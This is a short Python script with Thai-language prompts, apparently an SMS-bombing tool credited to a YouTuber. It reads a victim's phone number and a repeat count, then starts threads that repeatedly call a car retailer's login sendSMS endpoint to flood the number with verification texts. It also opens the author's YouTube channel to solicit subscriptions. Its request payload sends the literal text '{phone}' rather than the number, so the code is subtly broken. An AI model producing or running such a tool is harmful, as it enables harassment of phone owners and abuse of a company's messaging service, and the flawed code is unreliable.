import requests
import os
import time
import threading
from threading import Thread
os.system("clear")
time.sleep (1)
print ("\t\x1b[91mกำลังดาวน์โหลด.....")
time.sleep (5)
os.system ("clear")
time.sleep (1)
print ("\x1b[91mสำเร็จ!!!")
time.sleep (1)
print ("\x1b[96m[\x1b[91m1\x1b[96m] \x1b[96mกดติดตามก่อนใช้ \x1b[91m:V")
time.sleep (1)
os.system("xdg-open https://youtube.com/channel/UCwmhMExJ5V82NRYMUBR8Q6A")
time.sleep (5)
print ("\x1b[96m[\x1b[91m2\x1b[96m] \x1b[96mกดติดตามแล้ว\x1b[91m:)")
time.sleep (1)
print ("\x1b[91m")
os.system ("clear")
time.sleep (1)
print("\033[92mํ_______________________1api____________")
print("")
print("\033[92mของฟรีอย่าขาย")
print("")
print("")
print("\033[92mYouTube:Z-NightShot")
print("")
phone = input("\033[95m[+] เบอร์ : \033[0m")
num = int(input("\033[95m[+] จำนวน : \033[0m"))
os.system("clear")
print("\033[95m______________อยู่สื่อๆ______________")

def test(): 
	requests.post("https://www.carsome.co.th/website/login/sendSMS", data={"username":"{phone}","optType":0})
	print(f"ยิงไปที่ {phone} สำเร็จ")
	
#อย่าขายนะของฟรีอะ!!!!
#เครดิต:Z-NightShot

for i in range(num):
	time.sleep(1)
	threading.Thread(target=test).start()